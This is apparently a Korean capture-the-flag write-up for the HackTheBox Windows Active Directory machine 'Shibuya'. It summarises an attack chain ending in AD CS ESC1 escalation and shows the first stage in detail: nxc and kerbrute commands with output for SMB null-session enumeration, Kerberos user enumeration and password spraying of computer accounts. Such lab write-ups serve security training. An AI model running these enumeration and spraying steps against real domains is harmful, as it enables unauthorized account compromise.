![Shibuya](/assets/htb-windows/shibuya/shibuya.png)

**Shibuya**는 Medium 난이도의 Windows AD 머신으로, 초기에는 SMB와 Kerberos 사용자 열거를 통해 유효 계정 `red:red` 를 발견하면서 시작된다. 이후 `svc_autojoin` 계정의 description에서 평문 비밀번호를 획득해 추가 접근 권한을 얻는다.

해당 계정으로 내부를 탐색하던 중 `Windows Imaging Format (.wmi)` 파일에서 `simon.watson` 의 NTLM 해시를 발견하고 SSH 접근을 확보한다. 이후 활성 세션을 대상으로 **Cross Session Relay** 공격을 수행해 `nigel.mills` 계정의 해시를 탈취 및 크랙한다.

`nigel.mills` 는 `t1_admin` 그룹 소속으로 AD CS 인증서 템플릿에 대한 권한을 가지고 있으며, 이를 통해 **ESC1 취약점을 악용하여 인증서 기반 권한 상승**을 수행한다. 최종적으로 SYSTEM 권한을 획득하며 머신을 장악한다.

# Vulnerability Analysis

## SMB Enumeration

우선 `null session` 을 이용하여 SMB 인증을 시도하였다. 익명 로그인 자체는 가능하였으나, `share enumeration` 단계에서는 접근이 거부되었다:

```bash
$ nxc smb 10.129.234.42 -u '' -p '' --shares          

SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)                                                                                                                           
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\: 
SMB         10.129.234.42   445    AWSJPDC0522      [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

이후, [kerbrute](https://github.com/ropnop/kerbrute) 와 SecLists의 사용자 목록을 이용하여 Kerberos 기반 사용자 열거를 수행하였다:

```bash
$ kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d shibuya.vl --dc shibuya.vl

2026/05/08 05:07:49 >  Using KDC(s):
2026/05/08 05:07:49 >   shibuya.vl:88

2026/05/08 05:07:51 >  [+] VALID USERNAME:       purple@shibuya.vl
2026/05/08 05:07:55 >  [+] VALID USERNAME:       red@shibuya.vl
```

그 결과 `purple`, `red` 두 개의 유효한 계정을 확인할 수 있었다.

이후 발견한 사용자명을 기반으로 Password Spraying을 시도하였으나, 일반 사용자 인증은 모두 실패하였다:

```bash
$ nxc smb 10.129.234.42 -u user.txt -p user.txt --no-bruteforce

SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)                                                                                                                           
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\purple:purple STATUS_LOGON_FAILURE 
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\red:red STATUS_LOGON_FAILURE
```

하지만 계정명이 단순 사용자 계정보다는 컴퓨터 계정 네이밍과 유사하다고 판단하여, 각 계정명 뒤에 `$` 를 붙여 다시 시도하였다:

```bash
$ nxc smb 10.129.234.42 -u computer.txt -p user.txt --no-bruteforce

SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)                                                                                                                           
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\PURPLE$:purple STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\RED$:red STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

그 결과 `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` 오류가 반환되었으며, 이를 통해 `PURPLE$`, `RED$` 계정이 실제 컴퓨터 계정임을 확인할 수 있었다.

이후 Kerberos 인증을 사용하기 위해 시간 동기화(`ntpdate`)를 수행한 뒤 `-k` 옵션을 이용하여 재시도한 결과 정상적으로 인증에 성공하였다:

```bash
$ nxc smb 10.129.234.42 -u computer.txt -p user.txt --no-bruteforce --continue-on-success -k

SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)                                                                                                                           
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\PURPLE$:purple 
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\RED$:red
```
